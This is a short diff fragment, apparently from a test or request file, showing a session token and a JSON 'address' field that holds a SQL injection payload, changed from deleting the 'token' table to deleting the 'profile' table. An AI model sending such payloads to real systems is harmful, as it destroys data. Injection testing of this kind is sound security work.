@@ -97,5 +97,5 @@ Session: 1
 Token: yTthzxxodRwUtJjUE_SQiyznTrbjioZXveYX7zUDts0 	
 
 {
-    "address": "aaa'; DELETE FROM token; -- "
+    "address": "'; DELETE FROM profile; -- "
 }
